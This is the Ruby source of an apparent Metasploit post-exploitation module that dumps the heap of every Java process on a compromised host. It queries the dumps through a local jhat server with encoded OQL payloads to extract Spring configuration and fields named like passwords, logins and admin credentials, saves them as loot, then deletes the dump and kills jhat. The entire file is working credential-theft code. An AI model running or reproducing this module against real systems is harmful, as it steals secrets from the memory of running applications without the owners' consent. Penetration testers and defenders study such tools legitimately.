##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Post

  def initialize(info={})
    super(update_info(
      info,
      'Name'           => 'Java Heap Dump Extractor',
      'Description'    => %q{
        This module extract string credentials from the heapdump
        of a java application. You need access to the jdk.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [
        'jon',  # The Padawan who build the module
        'erik'  # The jedi master who think the module
      ],
      'Platform'       => [ 'win', 'linux', 'osx', 'unix', 'bsd' ],
      'SessionTypes'   => ['shell', 'meterpreter'],
    ))
    register_advanced_options([
      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp']),
      OptInt.new('UNUSED_PORT', [true, 'A port unused for our jhat instance', 7401]),
      OptInt.new('WAIT_TIMEOUT', [true, 'Seconds to wait to get jhat up', 10])
    ], self.class)
  end

  def run
    print_status 'Finding PIDs of Java processes'
    process = find_pids

    process.keys.each do |pid|
      dump_file = dump_process(pid)
      gather_from_dump(dump_file, pid, process[pid])
    end
  end

  def query(query)
    url = "http://localhost:#{datastore['UNUSED_PORT']}/oql/?query=#{query}"

    resp = cmd_exec("curl #{url}")
    vprint_status resp

    if resp =~ /^curl/
      print_bad "Curl error, maybe the port 'UNUSED_PORT' is used or 'WAIT_TIMEOUT' is too small (jhat can take some time)\n#{resp}"
      return nil
    end

    extraction = /\[ (.+) \]/.match(resp)

    loots = Array.new
    if extraction != nil
      print_good 'I found some classes with interesting field! Here you go :'

      extraction[1].split(', ').each do |arg|
        print_good arg
        loots.push(arg)
      end
    end
    loots
  end

  def find_pids
    # We use jps to enumerate all java process
    listing = cmd_exec('jps -V')

    vprint_status listing
    if listing.blank?
      print_error 'Unable to access to the jps command (the jdk may not be installed)'
      return nil
    end

    # Black list of all unwanted java process
    black_list = %w(Jps RemoteMavenServer)

    process = Hash.new

    listing.each_line do |entry|
      args = entry.split(' ')
      unless black_list.include?(args.at(1))
        process[args.at(0)] = args.at(1)
        print_status "Add PID %bld%red#{args.at(0)}%clr for process %cya#{args.at(1)}%clr"
      end
    end

    process
  end

  def dump_process(pid)
    dump_path = "#{datastore['WritableDir']}/#{Rex::Text.rand_text_alpha(6 + rand(5))}"
    print_status "Writing dump to '%cya#{dump_path}%clr'"

    vprint_status cmd_exec("jmap -dump:live,format=b,file=#{dump_path} #{pid}")
    dump_path
  end

  def gather_from_dump(dump_file, pid, name)
    # Launch jhat instance
    jhat_pid = cmd_exec_get_pid("jhat -port #{datastore['UNUSED_PORT']} -J-Xmx4G #{dump_file}")

    wait_time = datastore['WAIT_TIMEOUT']

    print_status "Waiting jhat initialisation for #{wait_time} sec"
    sleep(wait_time)

    print_status 'Trying to extract the spring configuration'
    first_payload = 'select+filter%28map%28pps.source.table%2Cfunction%28it%29%7Bif%28it%21%3Dnull%29return+it.key.'\
                    'toString%28%29%2B%27+%3D+%27%2Bit.value.toString%28%29%3B%7D%29%2C%22it%21%3Dnull%22%29+from+'\
                    'org.springframework.core.env.PropertiesPropertySource+pps'

    loots = query(first_payload)

    if loots != nil && loots.size > 0
      print_good "%bld%grnLooks like a Spring application! Store the loot as '%red#{pid}%grn.properties'%clr"
      store_loot("spring.configuration", "text/plain", session, loots, "#{pid}.properties", "Actual Spring configuration of #{name} (#{pid})")
    end

    search_terms = 'login%7Cpassword%7Cusername%7Cdatabase%7Ccreds%7Ccredential%7Cp4ss%7Cl0g1n%7Cl0gin%7Cus3r%7Cadmin%7C4dm1n'

    second_payload = 'select+filter%28map%28map%28filter%28heap.classes%28%29%2Cfunction%28it%29%7Bvar+interests%3D%2F'\
          + search_terms + '%2F%3Bfor%28field+in+it.fields%29if%28interests.test%28it.fields%5Bfield%5D.name.'\
          'toLowerCase%28%29%29%29+return+true%3Breturn+false%3B%7D%29%2C%22heap.objects%28it%2Ctrue%29%22%29%2C'\
          'function%28it%29%7Bvar+res%3D%22%22%3Bvar+interests%3D%2F' + search_terms + '%2F%3Bwhile%28it.hasMore'\
          'Elements%28%29%29%7Bit%3Dit.nextElement%28%29%3Bfor%28field+in+it%29%7Bif%28interests.test%28field.'\
          'toLowerCase%28%29%29%29%7Bif%28res%21%3D%3D%27%27%29res%2B%3D%27%2C+%27%3Bres%2B%3Dfield%2B%27+%3A+%27%2B'\
          '%28it%5Bfield%5D%3F%28it%5Bfield%5D.value%3Fit%5Bfield%5D.value.toString%28%29%3Ait%5Bfield%5D.toString%28'\
          '%29%29%3Ait%5Bfield%5D%29%3B%7D%7D%7Dreturn+res%3B%7D%29%2C%22it%22%29%3B'

    loots = query(second_payload)

    if loots != nil && loots.size > 0
      print_good "%bld%grnWow! That some interesting fields! Store the loot as '%red#{pid}%grn.extracted.txt'%clr"
      store_loot("java.heapdump.fields", "text/plain", session, loots, "#{pid}.extracted.txt", "Fields extracted from java heap dump of #{name} (#{pid})")
    end

    # Clean the mess
    kill_process(jhat_pid)
    cleanup_file(dump_file)
  end

  def kill_process(pid)
    print_status "Killing process %bld%red#{pid.to_i}%clr"
    vprint_status cmd_exec('killall jhat')
  end

  # When file dropper doesn't work
  def cleanup_file(file_path)
    vprint_status cmd_exec("rm #{file_path}")
  end

end
